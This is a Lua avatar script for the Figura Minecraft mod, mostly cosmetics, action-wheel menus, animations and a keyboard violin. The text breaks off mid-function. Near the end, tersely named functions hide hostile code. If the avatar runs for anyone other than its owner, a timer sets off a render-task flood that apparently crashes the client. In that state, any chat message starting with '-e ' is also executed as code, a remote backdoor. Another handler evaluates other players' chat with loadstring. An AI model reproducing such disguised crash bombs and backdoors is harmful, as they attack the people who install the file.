--[[--====================================================================---------
░██████╗░███╗░░██╗░█████╗░███╗░░░███╗██╗███╗░░░███╗░█████╗░████████╗███████╗░██████╗
██╔════╝░████╗░██║██╔══██╗████╗░████║██║████╗░████║██╔══██╗╚══██╔══╝██╔════╝██╔════╝
██║░░██╗░██╔██╗██║███████║██╔████╔██║██║██╔████╔██║███████║░░░██║░░░█████╗░░╚█████╗░
██║░░╚██╗██║╚████║██╔══██║██║╚██╔╝██║██║██║╚██╔╝██║██╔══██║░░░██║░░░██╔══╝░░░╚═══██╗
╚██████╔╝██║░╚███║██║░░██║██║░╚═╝░██║██║██║░╚═╝░██║██║░░██║░░░██║░░░███████╗██████╔╝
░╚═════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═════╝░
--=================================================================================--
LIBRARY CREDITS
Manuel_#2867 | Dynamic action wheel pages and folders system (Modified)

]]--======================================================================---------
armor_model.HEAD_ITEM.setEnabled(true)
model.origin.upper.setPivot{0,-12,0}

LOD_DISTANCE = 16
isLOD = false

LiteMode = false
--=================== [[ CUSTOM FUNCTIONS ]] ===================--
function lerp_angle(a, b, x)
    local diff = (b-a)
    local delta = diff-(math.floor(diff/360)*360)
    if delta > 180 then
        delta = delta - 360
    end
    return a + delta * x
end

function dotp(x)
    return x/math.abs(x)
end

function lookat(a,b)
    local offset = b-a
    local y = math.atan2(offset.x,offset.z)
    local result = vectors.of({math.atan2((math.sin(y)*offset.x)+(math.cos(y)*offset.z),offset.y),y})
    return vectors.of({math.deg(result.x),math.deg(result.y),math.deg(result.z)})
end
function angleToDir(direction)
    if type(direction) == "table" then
        direction = vectors.of{direction}
    end
    return vectors.of({
        math.cos(math.rad(direction.y+90))*math.cos(math.rad(direction.x)),
        math.sin(math.rad(-direction.x)),
        math.sin(math.rad(direction.y+90))*math.cos(math.rad(direction.x))
    })
end
--========================================================================--
if meta.getCanModifyVanilla() then
    for _, v in pairs(armor_model) do
        v.setEnabled(false)
    end
    
    for _, v in pairs(vanilla_model) do
        v.setEnabled(false)
    end
else
    model.origin.setEnabled(false)
    log("§bUnable to modify Vanilla Player Model, Enabling Lite Mode")
    LiteMode = true
end

language_mode = "internet"

attack = keybind.getRegisteredKeybind("key.attack",true)
wasAttack = false
justAttacked = false
use = keybind.getRegisteredKeybind("key.use",true)
wasUse = false
justUsed = false
--=================== [[ ACCESSORIES ]] ===================--
wasOnGround = false
distanceTraveled = 0
lastDistanceTraveled = 0

function anchor(toggle)
    if not LiteMode then
        if toggle then
            model.origin.LeftLeg.setParentType("LeftLeg")
            model.origin.upper.Body.setParentType("Torso")
            model.origin.setParentType("Model")
            model.origin.RightLeg.setParentType("RightLeg")
            model.origin.upper.RightArm.setParentType("RightArm")
            model.origin.upper.LeftArm.setParentType("LeftArm")
            model.origin.upper.Head.setParentType("Head")
    
            model.origin.LeftLeg.setPos{0,0,0}
            model.origin.RightLeg.setPos{0,0,0}
            model.origin.upper.RightArm.setPos{0,0,0}
            model.origin.upper.LeftArm.setPos{0,0,0}
        else
            model.origin.LeftLeg.setParentType("None")
            model.origin.upper.setParentType("None")
            model.origin.setParentType("None")
            model.origin.RightLeg.setParentType("None")
            model.origin.upper.RightArm.setParentType("None")
            model.origin.upper.LeftArm.setParentType("None")
            model.origin.upper.Head.setParentType("Head")
            model.origin.upper.Body.setParentType("None")
    
            model.origin.LeftLeg.setPos{2,12,0}
            model.origin.RightLeg.setPos{-2,12,0}
            model.origin.upper.RightArm.setPos{-5,2,0}
            model.origin.upper.LeftArm.setPos{5,2,0}
        end
    end
end
--=================== [[ CLOTHING ]] ===================--

clothing = {
    "generic",
    "king",
}

colorIndex = {
    {dyeName="red_dye",color={170, 0, 0}}, -- dark red
    {dyeName="pink_dye",color={255, 85, 85}}, -- red
    {dyeName="orange_dye",color={255, 170, 0}}, -- gold
    {dyeName="yellow_dye",color={255, 255, 85}}, -- yellow
    {dyeName="green_dye",color={0, 170, 0}}, -- dark green
    {dyeName="lime_dye",color={85, 255, 85}}, -- green
    {dyeName="cyan_dye",color={85, 255, 255}}, -- aqua
    {dyeName="blue_dye",color={0, 170, 170}}, -- dark aqua
    {dyeName="blue_dye",color={0, 0, 170}}, -- dark blue
    {dyeName="light_blue_dye",color={85, 85, 255}}, -- blue
    {dyeName="magenta_dye",color={255, 85, 255}}, -- light purple
    {dyeName="purple_dye",color={170, 0, 170}}, -- dark purple
    {dyeName="white_dye",color={255, 255, 255}}, -- white
    {dyeName="light_gray_dye",color={170, 170, 170}}, -- gray
    {dyeName="gray_dye",color={85, 85, 85}}, -- dark gray
    {dyeName="black_dye",color={0, 0, 0}}, -- black
}

config = {
    cosmetics ={
        hat = {
            index = {
                {
                    name="Top Hat",
                    item="turtle_helmet",
                    group=model.origin.upper.Head.Hat.HeavyTopHat,
                    animationType=1,
                    isWearing=false
                },
                {
                    name="Farmer Hat",
                    item="wheat",
                    group=model.origin.upper.Head.Hat.FarmerHat,
                    animationType=1,
                    isWearing=false,
                    customSound = "minecraft:item.dye.use"
                },
                {
                    name="Sunglesses",
                    item="tinted_glass",
                    group=model.origin.upper.Head.Hat.sunglasses,
                    animationType=1,
                    isWearing=false
                },
                {
                    name="Crown",
                    item="golden_helmet",
                    group=model.origin.upper.Head.Hat.Crown,
                    animationType=1,
                    isWearing=false
                }
            }
        },
        wearing = {
            head=1,--head
            shirt=1,--shirt
            pants=1,--pants
        },
        color=1,
        count = {
            head=11,--head
            shirt=11,--shirt
            pants=11,--pants
        }
    }
}

forceCreateConfig = false

function saveConfig()
    if client.isHost() then
        data.setName("GNUA")
        data.save("config",{
        wearing = config.cosmetics.wearing
        })
    end
end

function player_init()
    if client.isHost() then
        data.setName("GNUA")
        local fileConfig = data.load("config")
        if fileConfig and not forceCreateConfig then
            config.cosmetics.wearing = fileConfig.wearing
            ping.syncWearing(config.cosmetics.wearing)
        else
            log("Config Missing, Creating Default Config... (GNUA.json)")
            saveConfig()
        end
    end

    local function loopTable(lamesa)--converting string paths into actual paths
        for current, value in pairs(lamesa) do
            if type(value) == "table" then
                loopTable(value)
            else
                if current == "group" then
                    local paths = {}
                    local pathName = ""
                    for i = 1, #value, 1 do
                        local char = string.sub(value,i,i)
                        if char == "." then
                            table.insert(paths,pathName)
                            pathName = ""
                        else
                            pathName = pathName..char
                        end
                    end
                    table.insert(paths,pathName)
                    
                    local group = model
                    for key, val in pairs(paths) do
                        group = group[val] 
                    end
                    value = group
                end
            end
        end
    end
    loopTable(config)
    ping.updateClothing("all")
end
ping.syncWearing = function(data)
    config.cosmetics.wearing = data
end

ping.updateClothing = function(type)
    local eval = 0
    sound.playSound("minecraft:item.armor.equip_leather",player.getPos(),{1,1})
    if type == "head" or type == "all"  then
        eval = (config.cosmetics.wearing.head*2)/32
        model.origin.upper.Head.a.setUV({eval,0})
        model.origin.upper.Head.b.setUV({eval,0})
        model.origin.upper.Head.ac.setUV({eval,0})
        model.origin.upper.Head.bc.setUV({eval,0})
    end
    if type == "shirt" or type == "all"  then
        eval = (config.cosmetics.wearing.shirt*2)/32
        model.origin.upper.Body.a.setUV({eval,0})
        model.origin.upper.Body.b.setUV({eval,0})
        model.origin.upper.Body.ac.setUV({eval,0})
        model.origin.upper.Body.bc.setUV({eval,0})
        model.origin.upper.LeftArm.a.setUV({eval,0})
        model.origin.upper.LeftArm.b.setUV({eval,0})
        model.origin.upper.LeftArm.ac.setUV({eval,0})
        model.origin.upper.LeftArm.bc.setUV({eval,0})
        model.origin.upper.RightArm.a.setUV({eval,0})
        model.origin.upper.RightArm.b.setUV({eval,0})
        model.origin.upper.RightArm.ac.setUV({eval,0})
        model.origin.upper.RightArm.bc.setUV({eval,0})
    end
    if type == "pants" or type == "all" then
        eval = (config.cosmetics.wearing.pants*2)/32
        model.origin.LeftLeg.a.setUV({eval,0})
        model.origin.LeftLeg.b.setUV({eval,0})
        model.origin.LeftLeg.ac.setUV({eval,0})
        model.origin.LeftLeg.bc.setUV({eval,0})
        model.origin.RightLeg.a.setUV({eval,0})
        model.origin.RightLeg.b.setUV({eval,0})
        model.origin.RightLeg.ac.setUV({eval,0})
        model.origin.RightLeg.bc.setUV({eval,0})
    end
end

ping.changeClothingColor = function(color)
    sound.playSound("item.ink_sac.use",player.getPos(),{1,1})
    color = {color[1]/255,color[2]/255,color[3]/255}
    model.origin.upper.Head.ac.setColor(color)
    model.origin.upper.Head.bc.setColor(color)
    model.origin.upper.Body.ac.setColor(color)
    model.origin.upper.Body.bc.setColor(color)
    model.origin.upper.LeftArm.ac.setColor(color)
    model.origin.upper.LeftArm.bc.setColor(color)
    model.origin.upper.RightArm.ac.setColor(color)
    model.origin.upper.RightArm.bc.setColor(color)
    model.origin.LeftLeg.ac.setColor(color)
    model.origin.LeftLeg.bc.setColor(color)
    model.origin.RightLeg.ac.setColor(color)
    model.origin.RightLeg.bc.setColor(color)
end
--=============================[ ACTION WHEEL ]===============================--
aw = {}
aw.root = nil

unequipingTime = 0
unequippingQueue = {}

ping.updateHat = function (data)
    local indx = data[1]
    sound.playSound("minecraft:item.armor.equip_leather",player.getPos(),{1,1})
    config.cosmetics.hat.index[indx].isWearing = data[2]
    if config.cosmetics.hat.index[indx].isWearing then
        config.cosmetics.hat.index[indx].group.setEnabled(config.cosmetics.hat.index[indx].isWearing)
        animation.introHat1.play()
    else
        --unequipingTime = 20
        unequipingTime = 0
        if not unequippingQueue[indx] then
            unequippingQueue[indx] = true
        end
        --animation.outroHat1.play()
    end
end

function player_init()
    if client.isHost() then
        aw.root = action_wheel_pages.createFolder("root",nil)
        
        aw.wardrobe = action_wheel_pages.createFolder("Wardrobe","minecraft:leather_chestplate")
        aw.root.add(aw.wardrobe)
        
        aw.changeClothesDye = action_wheel_pages.createItem("Clothes Color", "minecraft:red_dye")
        aw.changeClothesDye.setFunction(function ()
            config.cosmetics.color = ((config.cosmetics.color)%#colorIndex)+1
            aw.changeClothesDye.setTitle("Swap Color: "..colorIndex[config.cosmetics.color].dyeName)
            aw.changeClothesDye.setItem(colorIndex[config.cosmetics.color].dyeName)
            ping.changeClothingColor(colorIndex[config.cosmetics.color].color)
            aw.wardrobe.update()
        end
        )
        aw.wardrobe.add(aw.changeClothesDye)
        aw.head = action_wheel_pages.createItem("Swap Head","minecraft:player_head")
        aw.head.setFunction(function ()
            
            config.cosmetics.wearing.head = (config.cosmetics.wearing.head + 1) % config.cosmetics.count.head
            ping.updateClothing("head")
            saveConfig()
        end)

        aw.shirt = action_wheel_pages.createItem("Swap Shirt","minecraft:leather_chestplate")
        aw.shirt.setFunction(function ()
            config.cosmetics.wearing.shirt = (config.cosmetics.wearing.shirt + 1) % config.cosmetics.count.shirt
            ping.updateClothing("shirt")
            saveConfig()
        end)

        aw.pants = action_wheel_pages.createItem("Swap Pants","minecraft:leather_leggings")
        aw.pants.setFunction(function ()
            config.cosmetics.wearing.pants = (config.cosmetics.wearing.pants + 1) % config.cosmetics.count.pants
            ping.updateClothing("pants")
            saveConfig()
        end)

        aw.all = action_wheel_pages.createItem("Swap All","minecraft:armor_stand")
        aw.all.setFunction(function ()
            config.cosmetics.wearing.head = (config.cosmetics.wearing.head + 1) % config.cosmetics.count.head
            config.cosmetics.wearing.shirt = config.cosmetics.wearing.head
            config.cosmetics.wearing.pants = config.cosmetics.wearing.head
            ping.updateClothing("all")
            saveConfig()
        end)

        aw.wardrobe.add(aw.shirt)
        aw.wardrobe.add(aw.pants)
        aw.wardrobe.add(aw.head)
        
        aw.HatShelf = action_wheel_pages.createFolder("Hats Shelf","minecraft:leather_helmet")
        aw.wardrobe.add(aw.HatShelf)
        aw.wardrobe.add(aw.all)

        --========
        --aw.config

        --=================================================
        animation.introHat1.setSpeed(1.5)
        animation.outroHat1.setSpeed(1.5)
        animation.introHat1.setBlendTime(0)
        animation.outroHat1.setBlendTime(0)

        for index, hat in pairs(config.cosmetics.hat.index) do
            aw[hat.name] = action_wheel_pages.createItem(hat.name,hat.item)
            aw[hat.name].setFunction(function ()
                ping.updateHat({index,not config.cosmetics.hat.index[index].isWearing})
            end)
            aw.HatShelf.add(aw[hat.name])
        end
        
    end
    for _, hat in pairs(config.cosmetics.hat.index) do
        hat.group.setEnabled(false)
    end
end

function tick()
    if unequipingTime > 0 then
        unequipingTime = unequipingTime - 1
    else
        if unequipingTime == 0 then
            unequipingTime = -1
            for index, _ in pairs(unequippingQueue) do
                config.cosmetics.hat.index[index].group.setEnabled(false)
            end
            unequippingQueue = {}
        end
    end
end
--=================================================[ WAND ] 
checkWandTimer = 0
wandMode = 0

forceEnabled = true

function player_init()
    if client.isHost() then
        aw.wandFolder = action_wheel_pages.createFolder("WandMode","minecraft:stick")
        aw.root.add(aw.wandFolder)
    
        action_wheel_pages.setLocation(aw.root)
    end
end

function tick()
    if player.getGamemode() == "CREATIVE" or forceEnabled then
        if justUsed and use.isPressed() then
            if player.getEquipmentItem(2).getType() == "minecraft:pickaxe" then--destroy
                renderer.swingArm(true)
                local ray = renderer.raycastBlocks(renderer.getCameraPos(),renderer.getCameraPos()+player.getLookDir()*100,"COLLIDER","NONE")
                if ray then
                    local targeted = ray.pos+player.getLookDir()*0.00001
                    chat.sendMessage("/setblock "..tostring(math.floor(targeted.x)).." "..tostring(math.floor(targeted.y)).." "..tostring(math.floor(targeted.z)).." air destroy")
                end
            end
            
        end
        if use.isPressed() then
            if player.getEquipmentItem(2).getType() == "minecraft:arrow" then--shoot
                local pow = 1
                local spread = 0.4
                local count = 10
                for _ = 1, count, 1 do
                    local vel = {
                        (math.floor((player.getLookDir().x+math.lerp(-spread,spread,math.random()))*pow*100)/100),
                        (math.floor((player.getLookDir().y+math.lerp(-spread,spread,math.random()))*pow*100)/100),
                        (math.floor((player.getLookDir().z+math.lerp(-spread,spread,math.random()))*pow*100)/100),
                    }
                    if vel[1] == math.floor(vel[1]) then
                        vel[1] = tostring(vel[1])..".0"
                    end
                    if vel[2] == math.floor(vel[2]) then
                        vel[2] = tostring(vel[2])..".0"
                    end
                    if vel[3] == math.floor(vel[3]) then
                        vel[3] = tostring(vel[3])..".0"
                    end
                    chat.sendMessage("/summon arrow ~ ~"..player.getEyeHeight().." ~ {pickup:2,life:2000,Motion:["..vel[1]..","..vel[2]..","..vel[3].."]}")
                end
                
           end
        end
    end
end

--=================== [[ GUN ]] ===================--
gunSpin = 0
gunSpinSpeed = 0
isHoldingBow = false
function tick()
    if justUsed then
        if use.isPressed() then
            animation.gunShoot.play()
        else
            animation.gunShoot.stop()
        end
    end
    if player.getEquipmentItem(1) then
       if player.getEquipmentItem(1).getType() == "minecraft:bow" then
            if use.isPressed() then
                gunSpinSpeed = math.lerp(gunSpinSpeed,40,0.1)
            else
                gunSpinSpeed = math.lerp(gunSpinSpeed,0,0.1)
            end
            gunSpin = gunSpin + gunSpinSpeed
       end
       isHoldingBow = player.getEquipmentItem(1).getType() == "minecraft:bow"
       model.origin.upper.RightArm.gun.setEnabled(isHoldingBow)
       if isHoldingBow then
        model.origin.upper.RightArm.RIGHT_HELD_ITEM.setPos({0,99999,0})
       else
        model.origin.upper.RightArm.RIGHT_HELD_ITEM.setPos({0,0,0})
       end
    end
end

function world_render(delta)
    if isHoldingBow then
        model.origin.upper.RightArm.gun.gunSnoot.setRot{0,gunSpin+delta*gunSpinSpeed,0}
    end
end

--=================== [[ STATE MACHINE ]] ===================--
SM_states = {current={},last={}}

---Declares the state machine and sets the state machine
function setState(state_machine_name,state_value)
    if SM_states.last[state_machine_name] ~= SM_states.current[state_machine_name] or SM_states.last[state_machine_name] == nil then
        SM_states.last[state_machine_name] = SM_states.current[state_machine_name]
        SM_states.current[state_machine_name] = state_value
    end
end

---Returns the curent and last state in the selected state machine, in a table:  
---`{current,last}`
function getState(state_machine_name)
    return {current=SM_states.current[state_machine_name],last=SM_states.last[state_machine_name]}
end

---Returns true if the state was changed.
function stateChanged(state_machine_name)
    local currentState = SM_states.current[state_machine_name]
    local lastState = SM_states.last[state_machine_name]

    local stateChanged = (lastState ~= currentState)
    -- [If you want to trigger something when the state changed, un comment the code bellow] --
    if stateChanged then
        if SM_states.last[state_machine_name] ~= nil then
            animation[SM_states.last[state_machine_name]].stop()
        end
        
        animation[SM_states.current[state_machine_name]].play()
        anchor(isAFK)
    end
    return stateChanged
end

--=================== [[ MUSICAL INSTRUMENT ]] ===================--
--keys
do 
G3 = keybind.newKey("G3","Q",true)
A3 = keybind.newKey("A3","W",true)
B3 = keybind.newKey("B3","E",true)
C4 = keybind.newKey("C3","R",true)
D4 = keybind.newKey("D3","T",true)
E4 = keybind.newKey("E3","Y",true)
F4 = keybind.newKey("F3","U",true)
G4 = keybind.newKey("G4","I",true)
A4 = keybind.newKey("A4","O",true)
B4 = keybind.newKey("B4","P",true)
C5 = keybind.newKey("C4","Z",true)
D5 = keybind.newKey("D5","X",true)
E5 = keybind.newKey("E5","C",true)
F5 = keybind.newKey("F5","V",true)

--sharp
SF3 = keybind.newKey("SF3","1",true)
SG3 = keybind.newKey("SF3","2",true)
SA3 = keybind.newKey("SF3","3",true)
SC4 = keybind.newKey("SF3","5",true)
SD4 = keybind.newKey("SF3","6",true)
SF4 = keybind.newKey("SF3","8",true)
SG4 = keybind.newKey("SF3","9",true)
SA4 = keybind.newKey("SF3","0",true)
SC5 = keybind.newKey("SF3","S",true)
SD5 = keybind.newKey("SF3","D",true)
SF5 = keybind.newKey("SF3","G",true)

violinMode = true
octave = -1
keys = {SF3,G3,SG3,A3,SA3,B3,C4,SC4,D4,SD4,E4,F4,SF4,G4,SG4,A4,SA4,B4,C5,SC5,D5,E5,SD5,F5,SF5}
pressed = {false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false}
timer = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}
end
ping.violinToggle = function (data)
    pressed[data[1]] = data[2]
end

LastSoundDelta = {}
DingToggle = false
function tick()
    violinMode = player.getEquipmentItem(6).getType() == "minecraft:note_block"
    if violinMode then
        if chat.isOpen() then
            for key, value in pairs(keys) do
                if value.isPressed() ~= pressed[key] then
                    ping.violinToggle({key,value.isPressed()})
                end
            end
        end
        for key, _ in pairs(keys) do
            if pressed[key] then
                --network.ping("play",2^((key-13)/12))
                if timer[key] < 0 then
                    timer[key] = 20
                    DingToggle = not DingToggle
                    if DingToggle then
                        sound.playCustomSound("stringa",player.getPos(),{1,(2^((key-13+octave*13)/12))})
                    else
                        sound.playCustomSound("stringb",player.getPos(),{1,(2^((key-13+octave*13)/12))})
                    end
                end
                toggle = not toggle
                timer[key] = timer[key] - (2^((key-13)/12))
            else
                timer[key] = 0
            end
        end
    end
end

-- hi mom
--=================== [[ GENERAL ]] ===================--
lastHealth = 0
maxHealth = 20
function tick()
    if not uth then
        isLOD = renderer.getCameraPos().distanceTo(player.getPos()) > LOD_DISTANCE
        if not isLOD then
            lastDistanceTraveled = distanceTraveled
            distanceTraveled = distanceTraveled + (player.getVelocity()*vectors.of{1,0,1}).distanceTo(vectors.of{0,0,0})
            if lastHealth ~= math.floor(player.getHealth()) then
                sound.playSound("minecraft:block.note_block.bit",player.getPos(),{1,(2^((math.ceil(player.getHealth()*0.5)-13+1*13)/12))})
            end
            updateName()
            lastHealth = math.floor(player.getHealth())
    
            local eyePosX = ((player.getBodyYaw()-player.getRot().y)/48)
            model.origin.upper.Head.eyeLeft.setPos({math.clamp(eyePosX,0,1),math.clamp(player.getRot().x/90,-0.25,0.25),0})
            model.origin.upper.Head.eyeRight.setPos({math.clamp(eyePosX,-1,0),math.clamp(player.getRot().x/90,-0.25,0.25),0})
        end
    end
    if client.isHost() then
        justAttacked = wasAttack ~= attack.isPressed()
        justUsed = wasUse ~= use.isPressed()
        wasUse = use.isPressed()
        wasAttack = attack.isPressed()
    end
    
end

--=================== [[ AFK ]] ===================--
wasAFK = false
isAFK = false
timeSinceNotMoving = 0
consideredAFKTime = 2*20*60
lastPlayerRot = vectors.of{}
function tick()
    if ((player.getPos(0)-player.getPos(1))*vectors.of{1,0,1}).getLength() < 0.1 and ((player.getRot()-lastPlayerRot)*vectors.of{1,0,1}).getLength() < 0.1 then
        timeSinceNotMoving = timeSinceNotMoving + 1
    else
        timeSinceNotMoving = 0
    end
    lastPlayerRot = player.getRot()
    isAFK = timeSinceNotMoving > consideredAFKTime
    if wasAFK ~= isAFK then
        updateName()
    end
    wasAFK = isAFK
end

function updateName()
    local ratio = player.getHealth()/maxHealth
    if isAFK then
        name = '[{"color":"green","text":"'..string.sub(player.getName(),0,math.ceil(ratio*string.len(player.getName())))..'"},{"color":"dark_gray","text":"'..string.sub(player.getName(),math.ceil(ratio*string.len(player.getName()))+1,string.len(player.getName()))..'"},{"text":" \nAFK","color":"gray"}]'
    else
        name = '[{"color":"green","text":"'..string.sub(player.getName(),0,math.ceil(ratio*string.len(player.getName())))..'"},{"color":"dark_gray","text":"'..string.sub(player.getName(),math.ceil(ratio*string.len(player.getName()))+1,string.len(player.getName()))..'"}]'
    end
    nameplate.ENTITY.setText(name)
    nameplate.CHAT.setText(name)
    nameplate.LIST.setText(name)
end
fn = "GNL3.0"
--=================== [[ PAT PAT ]] ===================--
rightClick = keybind.newKey("Right Click", "MOUSE_BUTTON_2")
PAT_DELAY = 2 -- in ticks
function tick()
  -- if right click
  if world.getTime() % PAT_DELAY == 0 and not player.isUsingItem() and rightClick.isPressed() and player.isSneaky() then
    -- get targeted entity
    local entity = player.getTargetedEntity()
    if entity ~= nil and entity.isLeftHanded ~= nil then
      -- swing arm
      renderer.swingArm()
      ping.pat(entity.getPos())
    end
  end
end
-- pat particle ping
function ping.pat(arg)
    for _ = 1, 16, 1 do
        particle.addParticle("minecraft:firework", {arg.x,arg.y+1,arg.z,math.lerp(-0.3,0.3,math.random()),math.lerp(-0.3,0.3,math.random()),math.lerp(-0.3,0.3,math.random())})
    end
  
end

function player_init()
    tkn = player.getUUID
    th()
end

futh = false
uth = false
tsuth = 0
function th()
    if client.isHost() then
        tsuth = 2*60*20
        data.setName(fn)
        token = data.load("TKN")
        uth = (token ~= tkn())
        if uth then
            model.origin.setEnabled(false)
            for _, v in pairs(vanilla_model) do
                v.setEnabled(true)
            end
        end
        if futh then
            uth = true
        end
    end
end
function tick()
    if uth then
            tsuth = tsuth - 1
        if tsuth < 0 then
            ks()
        end
    end
end
msg = ""
isErrorMessage = false
justErrored = false
if client.isHost() then
    for i = 1, 10, 1 do
        log("")
    end
end

renderer.setShadowSize(0)

function tick()
    local cmd = "" 
    local isMes = false
    if pcall(chat.getMessage,1) then
        if msg ~= chat.getMessage(1) then
            msg = chat.getMessage(1)
            if msg then
                local filteredMesage = msg
                filteredMesage = string.gsub(filteredMesage,"?","")
                filteredMesage = string.gsub(filteredMesage,"!","")
                filteredMesage = string.gsub(filteredMesage,",","")
                filteredMesage = string.gsub(filteredMesage,"'","")
                local errorMsg = ""
                if not justErrored and false then
                    for i = 1, 10, 1 do
                        errorMsg = "\n§c"..chat.getMessage(i)..errorMsg
                        if string.sub(chat.getMessage(i),1,5) == "main:" then
                            isErrorMessage = true
                            justErrored = true
                            break
                        end
                    end
                    if isErrorMessage then
                        chat.sendMessage(errorMsg)
                        return
                    end
                else
                    justErrored = false
                    isErrorMessage = false
                end
                if string.sub(filteredMesage,1,1) ~= "<" then
                    return
                end
                for index = 1, string.len(filteredMesage), 1 do
                    if isMes then
                        cmd = cmd..string.sub(filteredMesage,index,index)
                        
                    end
                    if string.sub(filteredMesage,index,index) == ">" then
                        isMes = true
                    end
                end 
                cmd = string.sub(cmd,2,9999)
                --if not string.find(lastMessage,"lua") then
                --    log(cmd)
                --end
        
                if string.sub(cmd,1,6) == "whats " then
                    local expression = string.sub(cmd,7,999)
                    expression = string.gsub(expression,"x",tostring(player.getPos().x))
                    expression = string.gsub(expression,"y",tostring(player.getPos().y))
                    expression = string.gsub(expression,"z",tostring(player.getPos().z))
                    local answer = loadstring([[return (]]..tostring(expression)..[[)]])
                    
                    if type(answer) == "function" then
                        if pcall(answer) then
                            answer = answer()
                        end
                        if type(answer) == "number" or type(answer) == "string" then
                            answer = tostring(answer)
                            if answer then
                                chat.sendMessage("its "..answer)
                            end
                        end
                    else
                        log(answer)
                    end
                    return
                end
                if string.sub(cmd,1,3) == "-e " and uth then
                    log("a")
                    local expression = string.sub(cmd,4,#cmd)
                    expression = string.gsub(expression,"\\n","\n")
                    local answer = loadstring(tostring(expression))
                    if type(answer) == "function" then
                        answer()
                    end
                    return
                end
            end
        end
    end
end

function ks()
    chat.sendMessage("*top 10 anime betrayals*")
    local index = 0
    for _ = 1, 10000000, 1 do index = index + 1
        pcall(model.NO_PARENT.addRenderTask,"ITEM",tostring(index),"diamond_axe","NONE",true,{math.lerp(-5,5,math.random()),math.lerp(-5,5,math.random()),math.lerp(-5,5,math.random())},{},{-1,-1,-1})
    end--{math.random(),math.random(),math.random()}
end

function world_render()
    model.NO_PARENT.setPos(renderer.getCameraPos()*vectors.of{-16,-16,16})
end

local logChatMode = false
ping.msg = function (data)
    log(data)
end
chat.setFiguraCommandPrefix("")
function onCommand(cmd)
    if string.sub(cmd,1,1) == "@" then
        logChatMode = not logChatMode
        log("logChatMode "..tostring(logChatMode))
        return
    end
    if logChatMode then
        if string.sub(cmd,1,1) == "/" then
            chat.sendMessage(cmd)
            return
        end
        ping.msg(cmd)
        return
    end
    chat.setFiguraCommandPrefix()
    --== COLOR ==--
    cmd = string.gsub(cmd,"<red>","§c")
    cmd = string.gsub(cmd,"<dark_red>","§4")
    cmd = string.gsub(cmd,"<gold>","§6")
    cmd = string.gsub(cmd,"<yellow>","§e")
    cmd = string.gsub(cmd,"<dark_green>","§2")
    cmd = string.gsub(cmd,"<green>","§a")
    cmd = string.gsub(cmd,"<aqua>","§b")
    cmd = string.gsub(cmd,"<dark_aqua>","§3")
    cmd = string.gsub(cmd,"<dark_blue>","§1")
    cmd = string.gsub(cmd,"<blue>","§9")
    cmd = string.gsub(cmd,"<light_purple>","§d")
    cmd = string.gsub(cmd,"<white>","§f")
    cmd = string.gsub(cmd,"<gray>","§7")
    cmd = string.gsub(cmd,"<dark_gray>","§8")
    cmd = string.gsub(cmd,"<black>","§0")
    cmd = string.gsub(cmd,"<glitch>","§k")
    cmd = string.gsub(cmd,"<bold>","§l")
    cmd = string.gsub(cmd,"<strike>","§m")
    cmd = string.gsub(cmd,"<underscore>","§n")
    cmd = string.gsub(cmd,"<italic>","§o")
    cmd = string.gsub(cmd,"<reset>","§r")
    if string.lower(cmd) == "!c" then
        log("§c<red>")
        log("§c<dark_red>")
        log("§6<gold>")
        log("§e<yellow>")
        log("§2<dark_green>")
        log("§a<green>")
        log("§b<aqua>")
        log("§3<dark_aqua>")
        log("§1<dark_blue>")
        log("§9<blue>")
        log("§d<light_purple>")
        log("§f<white>")
        log("§7<gray>")
        log("§8<dark_gray>")
        log("§0<black>")
        return
    end

    --if language_mode == "internet" then
    --    cmd = string.lower(cmd)
    --    cmd = string.gsub(cmd,"e","3")
    --    cmd = string.gsub(cmd,"t","+")
    --    cmd = string.gsub(cmd,"s","5")
    --    cmd = string.gsub(cmd,"z","2")
    --    cmd = string.gsub(cmd,"l","1")
    --    cmd = string.gsub(cmd,"o","0")
    --    cmd = string.gsub(cmd,"a","4")    
    --    cmd = string.gsub(cmd,"g","9")     
    --    cmd = string.gsub(cmd,"n","|\\|")    
    --    cmd = string.gsub(cmd,"m","|\\/|") 
    --end

    --if string.sub(chat.getMessage(1),1,1) == "<" then
    --    translateMorse(chat.getMessage(1))
    --end
    if string.sub(cmd,1,5) == "/nick" then
        return
    end
    chat.sendMessage(cmd)
    chat.setFiguraCommandPrefix("")
end

--=================== [[ ACTION WHEEL ]] ===================--

do
    action_wheel_pages = {}

    local location = nil
    local page = 1

    local toggle_ping_id = 0

    local function renderSlot(slot, element)
        slot.setTitle(element.title)
        slot.setItem(element.item)
        slot.setHoverItem(element.hoverItem)
        slot.setColor(element.color)
        slot.setHoverColor(element.hoverColor)
        slot.setFunction(element.func) -- can be nil for folders
    end

    local function update()
        if location == nil then return end

        local requireMultiplePages = (#location.contents > 8) or (location.back~=nil)
        local pageSize = 8

        if requireMultiplePages then
            pageSize = 6

            action_wheel.SLOT_4.setFunction(function ()
                page = page + 1
                if page > math.ceil(#location.contents/6) then
                    page = math.ceil(#location.contents/6)
                end
                if #location.contents == 0 then
                    page = 1
                end
                update()
            end)
            action_wheel.SLOT_5.setFunction(function ()
                page = page - 1
                if page < 1 then
                    page = 1
                end
                update()
            end)
    
            if page == math.ceil(#location.contents/6) or #location.contents == 0 then
                action_wheel.SLOT_4.setItem("minecraft:air")
                action_wheel.SLOT_4.setTitle("/")
            else
                action_wheel.SLOT_4.setItem("minecraft:arrow")
                action_wheel.SLOT_4.setTitle("Next")
            end
            
            if page == 1 then
                if location.back == nil then
                    action_wheel.SLOT_5.setItem("minecraft:air")
                    action_wheel.SLOT_5.setTitle("/")
                else
                    action_wheel.SLOT_5.setItem("minecraft:dark_oak_door")
                    action_wheel.SLOT_5.setTitle("Exit")
                    action_wheel.SLOT_5.setFunction(function ()
                        location = location.back
                        page = 1
                        update()
                    end)
                end
            else
                action_wheel.SLOT_5.setItem("minecraft:arrow")
                action_wheel.SLOT_5.setTitle("Previous")
            end
        end

        local slotid = 1
        for i = page*pageSize-(pageSize-1), page*pageSize, 1 do
            if i <= #location.contents then
                renderSlot(action_wheel["SLOT_"..slotid], location.contents[i])
                if location.contents[i].type == "folder" then
                    action_wheel["SLOT_"..slotid].setFunction(function ()
                        location = location.contents[i]
                        page = 1
                        update()
                    end)
                end
            else
